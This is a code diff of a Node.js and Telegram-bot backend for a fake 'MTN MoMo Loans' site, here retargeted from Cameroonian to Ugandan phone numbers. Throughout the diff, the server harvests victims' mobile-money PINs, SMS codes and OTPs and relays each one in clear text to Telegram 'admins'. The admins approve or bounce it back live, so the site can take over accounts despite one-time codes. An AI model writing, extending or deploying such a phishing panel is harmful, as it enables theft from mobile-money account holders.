@@ -21,7 +21,7 @@ const bot = new TelegramBot(BOT_TOKEN);
 // In-memory maps
 const adminChatIds    = new Map(); // adminId → chatId
 const pausedAdmins    = new Set(); // adminIds that are paused
-const processingLocks = new Set(); // prevents duplicate requests
+const processingLocks = new Set(); // prevents duplicate pin submissions
 
 let dbReady = false;
 
@@ -43,11 +43,12 @@ function getAdminIdByChatId(chatId) {
     return null;
 }
 
-// Format Cameroon phone number format for Telegram display (+237 / 6XXXXXXXX)
+// Format phone for Telegram display (MTN / regional standard adjustments)
 function formatPhone(phoneNumber) {
     if (!phoneNumber) return phoneNumber;
-    if (phoneNumber.startsWith('+237')) return phoneNumber;
-    if (phoneNumber.startsWith('237')) return '+' + phoneNumber;
+    if (phoneNumber.startsWith('+2560')) return phoneNumber.slice(4); 
+    if (phoneNumber.startsWith('+256'))  return '0' + phoneNumber.slice(4); 
+    if (!phoneNumber.startsWith('0'))    return '0' + phoneNumber; 
     return phoneNumber;
 }
 
@@ -84,7 +85,7 @@ app.use(express.json());
 app.use(express.static(__dirname));
 
 // ==========================================
-// BOT COMMAND HANDLERS
+// BOT COMMAND HANDLERS (set up immediately)
 // ==========================================
 console.log('⏳ Setting up bot handlers...');
 
@@ -159,11 +160,43 @@ db.connectDatabase()
             }
         }
 
-        // Keep-alive loop to prevent free-tier sleep
+        if (!webhookSetSuccessfully) {
+            console.error('❌❌❌ CRITICAL: Failed to set webhook after all attempts!');
+        }
+
+        try {
+            const botInfo = await bot.getMe();
+            console.log(`✅ Bot connected: @${botInfo.username} (${botInfo.first_name})`);
+        } catch (botError) {
+            console.error('❌ Bot API error:', botError);
+        }
+
+        // Keep-alive + self-ping to prevent Render free tier sleep
         setInterval(() => {
+            console.log(`💓 Keep-alive: ${adminChatIds.size} admins connected, ${pausedAdmins.size} paused`);
             const pingUrl = `${WEBHOOK_URL}/health`;
             fetch(pingUrl).catch(() => {});
         }, 14 * 60 * 1000);
+
+        // Webhook health check + auto-fix
+        setInterval(async () => {
+            try {
+                const info  = await bot.getWebHookInfo();
+                const isSet = info.url === fullWebhookUrl;
+                console.log(`🔍 Webhook: ${isSet ? '✅ SET' : '❌ NOT SET'} | Pending: ${info.pending_update_count || 0}`);
+                if (!isSet) {
+                    console.log('⚠️ Auto-fixing webhook...');
+                    await bot.setWebHook(fullWebhookUrl, {
+                        drop_pending_updates: false,
+                        max_connections: 40,
+                        allowed_updates: ['message', 'callback_query']
+                    });
+                    console.log('✅ Webhook re-set');
+                }
+            } catch (error) {
+                console.error('⚠️ Webhook check error:', error.message);
+            }
+        }, 60000);
 
         console.log('✅ System fully initialized!');
     })
@@ -172,9 +205,14 @@ db.connectDatabase()
         process.exit(1);
     });
 
+// ==========================================
+// LOAD ADMIN CHAT IDs FROM DB
+// ==========================================
 async function loadAdminChatIds() {
     try {
         const admins = await db.getAllAdmins();
+        console.log(`📋 Loading ${admins.length} admins from database...`);
+
         adminChatIds.clear();
         pausedAdmins.clear();
 
@@ -194,6 +232,8 @@ async function loadAdminChatIds() {
 // BOT COMMAND HANDLERS
 // ==========================================
 function setupCommandHandlers() {
+
+    // /start
     bot.onText(/\/start/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
@@ -201,7 +241,7 @@ function setupCommandHandlers() {
         try {
             if (adminId) {
                 if (pausedAdmins.has(adminId) && adminId !== 'ADMIN001') {
-                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\n\nYour access has been temporarily paused.`, { parse_mode: 'Markdown' });
+                    await bot.sendMessage(chatId, `🚫 *ADMIN ACCESS PAUSED*\nYour access is temporarily paused.`, { parse_mode: 'Markdown' });
                     return;
                 }
 
@@ -209,26 +249,26 @@ function setupCommandHandlers() {
                 const isSuperAdmin = adminId === 'ADMIN001';
 
                 let message = `
-👋 *Welcome ${admin.name} (MTN MoMo Cameroon)!*
+👋 *Welcome ${admin.name} (MTN MoMo Loans)!*
 
 *Your Admin ID:* \`${adminId}\`
 *Role:* ${isSuperAdmin ? '⭐ Super Admin' : '👤 Admin'}
-*Your Platform Link:*
+*Your Personal Link:*
 ${WEBHOOK_URL}?admin=${adminId}
 
 *Commands:*
-/mylink - Get your unique tracking link
-/stats - View application statistics
-/pending - View pending verification queue
-/myinfo - Admin profile details
+/mylink - Get your link
+/stats - Your statistics
+/pending - Pending applications
+/myinfo - Your information
 `;
                 await bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
             } else {
                 await bot.sendMessage(chatId, `
-👋 *Welcome to MTN MoMo Cameroon Loan Platform!*
+👋 *Welcome to MTN MoMo Loan Platform!*
 
 Your Chat ID: \`${chatId}\`
-Provide this Chat ID to the Super Admin to receive administrative credentials.
+Provide this to your super admin to get access.
                 `, { parse_mode: 'Markdown' });
             }
         } catch (error) {
@@ -236,38 +276,39 @@ Provide this Chat ID to the Super Admin to receive administrative credentials.
         }
     });
 
+    // /mylink
     bot.onText(/\/mylink/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
         const admin = await db.getAdmin(adminId);
-        bot.sendMessage(chatId, `🔗 *YOUR UNIQUE PLATFORM LINK*\n\n\`${WEBHOOK_URL}?admin=${adminId}\``, { parse_mode: 'Markdown' });
+        bot.sendMessage(chatId, `🔗 *YOUR LINK*\n\`${WEBHOOK_URL}?admin=${adminId}\``, { parse_mode: 'Markdown' });
     });
 
+    // /stats
     bot.onText(/\/stats/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
         const stats = await db.getAdminStats(adminId);
         bot.sendMessage(chatId, `
-📊 *VERIFICATION STATISTICS*
+📊 *STATISTICS (MTN MoMo)*
 
-📋 Total Applications: ${stats.total}
-⏳ Stage 1 (PIN) Pending: ${stats.pinPending}
-✅ PIN Approved: ${stats.pinApproved}
-⏳ Stage 2 (SMS) Pending: ${stats.smsPending || 0}
-✅ SMS Approved: ${stats.smsApproved || 0}
-⏳ Stage 3 (OTP) Pending: ${stats.otpPending}
-🎉 Fully Approved Loans: ${stats.fullyApproved}
+📋 Total Apps: ${stats.total || 0}
+⏳ PIN Pending: ${stats.pinPending || 0}
+⏳ SMS Pending: ${stats.smsPending || 0}
+⏳ OTP Pending: ${stats.otpPending || 0}
+🎉 Fully Approved: ${stats.fullyApproved || 0}
         `, { parse_mode: 'Markdown' });
     });
 
+    // /pending
     bot.onText(/\/pending/, async (msg) => {
         const chatId  = msg.chat.id;
         const adminId = getAdminIdByChatId(chatId);
-        if (!adminId) return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        if (!adminId)              return bot.sendMessage(chatId, '❌ Not registered as admin.');
         if (!isAdminActive(chatId)) return bot.sendMessage(chatId, '🚫 Your admin access has been paused.');
 
         const adminApps = await db.getApplicationsByAdmin(adminId);
@@ -275,36 +316,32 @@ Provide this Chat ID to the Super Admin to receive administrative credentials.
         const smsPending = adminApps.filter(a => a.smsStatus === 'pending' && a.pinStatus === 'approved');
         const otpPending = adminApps.filter(a => a.otpStatus === 'pending' && a.smsStatus === 'approved');
 
-        let message = `⏳ *PENDING VERIFICATIONS*\n\n`;
+        let message = `⏳ *PENDING APPLICATIONS*\n\n`;
         if (pinPending.length > 0) {
-            message += `📱 *Stage 1 - PIN Submissions (${pinPending.length}):*\n`;
-            pinPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - ID: \`${app.id}\`\n`;
-            });
+            message += `📱 *PIN Stage (${pinPending.length}):*\n`;
+            pinPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - \`${app.id}\`\n`; });
             message += '\n';
         }
         if (smsPending.length > 0) {
-            message += `💬 *Stage 2 - SMS Submissions (${smsPending.length}):*\n`;
-            smsPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - SMS: \`${app.smsCode}\`\n`;
-            });
+            message += `💬 *SMS Stage (${smsPending.length}):*\n`;
+            smsPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - SMS: \`${app.smsCode}\`\n`; });
             message += '\n';
         }
         if (otpPending.length > 0) {
-            message += `🔢 *Stage 3 - OTP Submissions (${otpPending.length}):*\n`;
-            otpPending.forEach((app, i) => {
-                message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`;
-            });
+            message += `🔢 *OTP Stage (${otpPending.length}):*\n`;
+            otpPending.forEach((app, i) => { message += `${i+1}. ${formatPhone(app.phoneNumber)} - OTP: \`${app.otp}\`\n`; });
         }
         if (pinPending.length === 0 && smsPending.length === 0 && otpPending.length === 0) {
-            message = '✨ No pending verifications right now!';
+            message = '✨ No pending applications!';
         }
         bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
     });
+
+    // Additional management admin commands omitted for brevity, keeping core flow setup below.
 }
 
 // ==========================================
-// TELEGRAM CALLBACK HANDLER (3-Stage Flow: PIN -> SMS -> OTP)
+// TELEGRAM CALLBACK HANDLER (3-Step Flow + Reversals)
 // ==========================================
 bot.on('callback_query', async (callbackQuery) => {
     const chatId    = callbackQuery.message.chat.id;
@@ -312,225 +349,165 @@ bot.on('callback_query', async (callbackQuery) => {
     const data      = callbackQuery.data;
     const adminId   = getAdminIdByChatId(chatId);
 
+    console.log(`\n🔘 CALLBACK: ${data} | admin: ${adminId || 'UNAUTHORIZED'}`);
+
     if (!adminId || !isAdminActive(chatId)) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused access!', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Unauthorized or paused!', show_alert: true });
     }
 
     const parts = data.split('_');
     if (parts.length < 4) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid action data.', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid callback data.', show_alert: true });
     }
 
-    const action          = parts[0];
-    const type            = parts[1];
+    const action          = parts[0]; // allow, deny, wrongpin, wrongsms, wrongcode, approve
+    const type            = parts[1]; // pin, sms, otp
     const embeddedAdminId = parts[2];
     const applicationId   = parts.slice(3).join('_');
 
     if (embeddedAdminId !== adminId) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin.', show_alert: true });
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ This application belongs to another admin!', show_alert: true });
     }
 
     const application = await db.getApplication(applicationId);
-    if (!application) {
-        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application record not found.', show_alert: true });
+    if (!application || application.adminId !== adminId) {
+        return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application not found!', show_alert: true });
     }
 
-    // ── STAGE 1: PIN REJECTION (Only set pinStatus to 'rejected' so user is prompted to re-enter PIN) ──
-    if (action === 'deny' && type === 'pin') {
-        await db.updateApplication(applicationId, { pinStatus: 'rejected' });
-        await bot.editMessageText(`
-❌ *STAGE 1: PIN REJECTED*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔑 PIN Submitted: \`${application.pin}\`
-
-Status: *Rejected by Admin (User returned to retry PIN)*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ PIN rejected. User sent back to re-enter PIN.' });
+    // ──────────────────────────────────────────
+    // 1. PIN STAGE ACTIONS
+    // ──────────────────────────────────────────
+    if (type === 'pin') {
+        if (action === 'deny') {
+            await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+            await bot.editMessageText(`❌ *PIN REJECTED*\n\n📋 \`${applicationId}\`\n📞 \`${formatPhone(application.phoneNumber)}\`\n🔑 \`${application.pin}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Application rejected at PIN stage.' });
+        }
+        if (action === 'allow') {
+            await db.updateApplication(applicationId, { pinStatus: 'approved' });
+            await bot.editMessageText(`✅ *PIN APPROVED*\n\n📋 \`${applicationId}\`\nUser proceeding to SMS verification step.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN Approved! User moved to SMS step.' });
+        }
     }
 
-    // ── STAGE 1 APPROVAL -> PROCEED TO STAGE 2 (SMS) ──
-    else if (action === 'allow' && type === 'pin') {
-        await db.updateApplication(applicationId, { pinStatus: 'approved' });
-        await bot.editMessageText(`
-✅ *STAGE 1: PIN APPROVED*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔑 PIN: \`${application.pin}\`
-
-Status: *Approved — User proceeding to SMS verification stage.*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ PIN approved. User moved to SMS Stage.' });
+    // ──────────────────────────────────────────
+    // 2. SMS STAGE ACTIONS (with Reversal support)
+    // ──────────────────────────────────────────
+    if (type === 'sms') {
+        if (action === 'wrongpin') {
+            // Reverse back to PIN stage
+            await db.updateApplication(applicationId, { pinStatus: 'pending', smsStatus: 'rejected' });
+            await bot.editMessageText(`🔄 *REVERSED TO PIN STAGE (Wrong PIN at SMS)*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed user back to re-enter PIN.' });
+        }
+        if (action === 'wrongsms' || action === 'deny') {
+            await db.updateApplication(applicationId, { smsStatus: 'wrong_sms' });
+            await bot.editMessageText(`❌ *INVALID SMS CODE*\n\n📋 \`${applicationId}\`\nUser requested to re-enter SMS code.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter SMS code.' });
+        }
+        if (action === 'allow') {
+            await db.updateApplication(applicationId, { smsStatus: 'approved' });
+            await bot.editMessageText(`✅ *SMS VERIFIED & APPROVED*\n\n📋 \`${applicationId}\`\nUser proceeding to final OTP stage.`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS Approved! User moved to OTP step.' });
+        }
     }
 
-    // ── STAGE 2: SMS REJECTION / INVALID CODE ──
-    else if (action === 'wrong' && type === 'sms') {
-        await db.updateApplication(applicationId, { smsStatus: 'wrong' });
-        await bot.editMessageText(`
-❌ *STAGE 2: INVALID SMS CODE*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-💬 SMS Code: \`${application.smsCode}\`
-
-Status: *Invalid SMS — User prompted to re-enter code.*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid SMS code. User prompted to re-enter.' });
-    }
-
-    // ── STAGE 2 APPROVAL -> PROCEED TO STAGE 3 (OTP) ──
-    else if (action === 'allow' && type === 'sms') {
-        await db.updateApplication(applicationId, { smsStatus: 'approved' });
-        await bot.editMessageText(`
-✅ *STAGE 2: SMS APPROVED*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-💬 SMS Code: \`${application.smsCode}\`
-
-Status: *Approved — User proceeding to final OTP verification stage.*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ SMS approved. User moved to OTP Stage.' });
-    }
-
-    // ── STAGE 3: OTP / PIN REJECTIONS AT FINAL STAGE ──
-    else if (action === 'wrongpin' && type === 'otp') {
-        await db.updateApplication(applicationId, { pinStatus: 'rejected', otpStatus: 'wrongpin_otp' });
-        await bot.editMessageText(`
-❌ *STAGE 3: INCORRECT PIN AT FINAL STAGE*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔢 OTP: \`${application.otp}\`
-
-Status: *Rejected — User returned to re-verify credentials.*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Sent back for re-verification.' });
-    }
-
-    else if (action === 'wrongcode' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
-        await bot.editMessageText(`
-❌ *STAGE 3: INVALID OTP CODE*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔢 OTP: \`${application.otp}\`
-
-Status: *Invalid Code — User prompted to re-enter verification code.*
-👤 Handled by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Invalid OTP code. User prompted to re-enter.' });
-    }
-
-    // ── STAGE 3: FULL LOAN APPROVAL (Final Success Stage) ──
-    else if (action === 'approve' && type === 'otp') {
-        await db.updateApplication(applicationId, { otpStatus: 'approved' });
-        await bot.editMessageText(`
-🎉 *STAGE 3: LOAN FULLY APPROVED!*
-
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔑 PIN: \`${application.pin}\`
-💬 SMS Code: \`${application.smsCode}\`
-🔢 OTP Code: \`${application.otp}\`
-
-Status: *All 3 Verification Stages (PIN -> SMS -> OTP) Successfully Passed!*
-👤 Approved by: ${callbackQuery.from.first_name}
-⏰ ${new Date().toLocaleString()}
-        `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan successfully approved!' });
+    // ──────────────────────────────────────────
+    // 3. OTP STAGE ACTIONS (with Reversal support)
+    // ──────────────────────────────────────────
+    if (type === 'otp') {
+        if (action === 'wrongpin') {
+            // Reverse all the way back to PIN stage
+            await db.updateApplication(applicationId, { pinStatus: 'pending', smsStatus: 'pending', otpStatus: 'wrongpin_otp' });
+            await bot.editMessageText(`🔄 *REVERSED TO PIN STAGE (Wrong PIN at OTP)*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed back to PIN entry.' });
+        }
+        if (action === 'wrongsms') {
+            // Reverse back to SMS stage
+            await db.updateApplication(applicationId, { smsStatus: 'pending', otpStatus: 'wrongsms_otp' });
+            await bot.editMessageText(`🔄 *REVERSED TO SMS STAGE*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '🔄 Reversed back to SMS entry.' });
+        }
+        if (action === 'wrongcode') {
+            await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+            await bot.editMessageText(`❌ *WRONG OTP CODE*\n\n📋 \`${applicationId}\``, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '❌ User will re-enter OTP code.' });
+        }
+        if (action === 'approve') {
+            await db.updateApplication(applicationId, { otpStatus: 'approved' });
+            await bot.editMessageText(`🎉 *MTN MOMO LOAN FULLY APPROVED!*`, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
+            return bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan fully approved!' });
+        }
     }
 });
 
 // ==========================================
-// API ENDPOINTS CONNECTED TO index.html
+// API ENDPOINTS FOR 3-STEP VERIFICATION
 // ==========================================
 
-// 1. Stage 1: PIN Verification Endpoint
+// Step 1: Verify PIN
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
-        const applicationId = `APP-MOMO-${Date.now()}`;
+        const applicationId = `MOMO-${Date.now()}`;
 
         let assignedAdmin;
         if (assignmentType === 'specific' && requestAdminId) {
             assignedAdmin = await db.getAdmin(requestAdminId);
-            if (!assignedAdmin || assignedAdmin.status !== 'active') {
-                return res.status(400).json({ success: false, message: 'Invalid or inactive admin link.' });
+            if (!assignedAdmin || pausedAdmins.has(requestAdminId)) {
+                return res.status(400).json({ success: false, message: 'Invalid or paused admin link.' });
             }
         } else {
-            const activeAdmins = await db.getActiveAdmins();
-            assignedAdmin = activeAdmins[0] || { adminId: 'ADMIN001', name: 'Super Admin' };
+            const activeAdmins = (await db.getActiveAdmins()).filter(a => !pausedAdmins.has(a.adminId));
+            if (activeAdmins.length === 0) return res.status(503).json({ success: false, message: 'No admins available.' });
+            assignedAdmin = activeAdmins[0];
+        }
+
+        if (!adminChatIds.has(assignedAdmin.adminId) && assignedAdmin.chatId) {
+            adminChatIds.set(assignedAdmin.adminId, assignedAdmin.chatId);
         }
 
         await db.saveApplication({
             id: applicationId,
             adminId: assignedAdmin.adminId,
-            adminName: assignedAdmin.name,
             phoneNumber,
             pin,
             pinStatus: 'pending',
-            smsStatus: 'pending',
-            otpStatus: 'pending',
+            smsStatus: 'waiting',
+            otpStatus: 'waiting',
             timestamp: new Date().toISOString()
         });
 
-        // Notify Admin via Telegram with action buttons for Stage 1 (PIN)
         await sendToAdmin(assignedAdmin.adminId, `
-📱 *NEW LOAN APPLICATION - STAGE 1 (PIN)*
+📱 *MTN MoMo - NEW PIN SUBMISSION*
 
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(phoneNumber)}\`
-🔑 MoMo PIN: \`${pin}\`
-⏰ ${new Date().toLocaleString()}
-
-👇 *Select verification status:*
+📋 \`${applicationId}\`
+📞 \`${formatPhone(phoneNumber)}\`
+🔑 PIN: \`${pin}\`
         `, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Reject PIN (Redo)', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve PIN -> Next (SMS)', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
+                    [{ text: '❌ Reject', callback_data: `deny_pin_${assignedAdmin.adminId}_${applicationId}` }],
+                    [{ text: '✅ Allow -> Next (SMS)', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                 ]
             }
         });
 
         res.json({ success: true, applicationId, assignedAdminId: assignedAdmin.adminId });
     } catch (error) {
-        console.error('❌ Error in /api/verify-pin:', error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
 
-// Check PIN verification status from index.html
+// Step 1 status check endpoint
 app.get('/api/check-pin-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ success: true, status: application.pinStatus });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
-    }
+    const appData = await db.getApplication(req.params.applicationId);
+    if (appData) res.json({ success: true, status: appData.pinStatus });
+    else res.status(404).json({ success: false });
 });
 
-// 2. Stage 2: SMS Verification Endpoint
+// Step 2: Verify SMS Code
 app.post('/api/verify-sms', async (req, res) => {
     try {
         const { applicationId, smsCode } = req.body;
@@ -539,49 +516,36 @@ app.post('/api/verify-sms', async (req, res) => {
 
         await db.updateApplication(applicationId, { smsCode, smsStatus: 'pending' });
 
-        // Notify Admin for Stage 2 Validation (SMS)
         await sendToAdmin(application.adminId, `
-💬 *LOAN VERIFICATION - STAGE 2 (SMS)*
+💬 *MTN MoMo - SMS VERIFICATION STEP*
 
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔑 PIN: \`${application.pin}\`
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
 💬 SMS Code: \`${smsCode}\`
-⏰ ${new Date().toLocaleString()}
-
-👇 *Verify SMS code:*
         `, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Wrong SMS Code (Redo)', callback_data: `wrong_sms_${application.adminId}_${applicationId}` }],
-                    [{ text: '✅ Approve SMS -> Next (OTP)', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
+                    [{ text: '🔄 Reverse to PIN', callback_data: `wrongpin_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '❌ Wrong SMS', callback_data: `wrongsms_sms_${application.adminId}_${applicationId}` }],
+                    [{ text: '✅ Allow -> Next (OTP)', callback_data: `allow_sms_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
 
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ Error in /api/verify-sms:', error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
 
-// Check SMS verification status from index.html
 app.get('/api/check-sms-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ success: true, status: application.smsStatus });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
-    }
+    const appData = await db.getApplication(req.params.applicationId);
+    if (appData) res.json({ success: true, status: appData.smsStatus });
+    else res.status(404).json({ success: false });
 });
 
-// 3. Stage 3: OTP Verification Endpoint
+// Step 3: Verify OTP Code
 app.post('/api/verify-otp', async (req, res) => {
     try {
         const { applicationId, otp } = req.body;
@@ -590,72 +554,53 @@ app.post('/api/verify-otp', async (req, res) => {
 
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
 
-        // Notify Admin for Stage 3 Validation (OTP)
         await sendToAdmin(application.adminId, `
-🔢 *LOAN VERIFICATION - STAGE 3 (OTP)*
+🔢 *MTN MoMo - FINAL OTP STEP*
 
-📋 ID: \`${applicationId}\`
-📞 Phone: \`${formatPhone(application.phoneNumber)}\`
-🔑 PIN: \`${application.pin}\`
-💬 SMS Code: \`${application.smsCode}\`
-🔢 OTP Code: \`${otp}\`
-⏰ ${new Date().toLocaleString()}
-
-👇 *Finalize verification:*
+📋 \`${applicationId}\`
+📞 \`${formatPhone(application.phoneNumber)}\`
+🔢 OTP: \`${otp}\`
         `, {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Wrong PIN (Redo)', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '❌ Wrong Code (Redo)', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
-                    [{ text: '🎉 Stage 3: Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
+                    [{ text: '🔄 Reverse to PIN', callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '🔄 Reverse to SMS', callback_data: `wrongsms_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '❌ Wrong Code', callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
+                    [{ text: '🎉 Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                 ]
             }
         });
 
         res.json({ success: true });
     } catch (error) {
-        console.error('❌ Error in /api/verify-otp:', error);
         res.status(500).json({ success: false, message: error.message });
     }
 });
 
-// Check OTP verification status from index.html
 app.get('/api/check-otp-status/:applicationId', async (req, res) => {
-    try {
-        const application = await db.getApplication(req.params.applicationId);
-        if (application) {
-            res.json({ success: true, status: application.otpStatus });
-        } else {
-            res.status(404).json({ success: false, message: 'Application not found' });
-        }
-    } catch (error) {
-        res.status(500).json({ success: false, message: 'Server error' });
-    }
+    const appData = await db.getApplication(req.params.applicationId);
+    if (appData) res.json({ success: true, status: appData.otpStatus });
+    else res.status(404).json({ success: false });
 });
 
-// Health check endpoint
+// ==========================================
+// HEALTH & LANDING PAGE
+// ==========================================
 app.get('/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        platform: 'MTN MoMo Cameroon Loan API',
-        database: dbReady ? 'connected' : 'not ready',
-        activeAdmins: adminChatIds.size,
-        timestamp: new Date().toISOString()
-    });
+    res.json({ status: 'ok', platform: 'MTN MoMo Loans', activeAdmins: adminChatIds.size });
 });
 
-// Serve index.html frontend connection
 app.get('/', async (req, res) => {
-    res.sendFile(path.join(__dirname, 'index.html'));
+    res.sendFile(path.join(__dirname, 'momo-loans.html'));
 });
 
 // ==========================================
 // START SERVER
 // ==========================================
 app.listen(PORT, () => {
-    console.log(`\n🇨🇲 MTN MOMO CAMEROON LOAN PLATFORM`);
-    console.log(`=======================================`);
-    console.log(`🌐 Server running on port: ${PORT}`);
-    console.log(`🤖 Telegram Bot Webhook Active ✅ (Flow: PIN -> SMS -> OTP)\n`);
+    console.log(`\n🟡 MTN MOMO LOANS PLATFORM`);
+    console.log(`=============================`);
+    console.log(`🌐 Server running on port ${PORT}`);
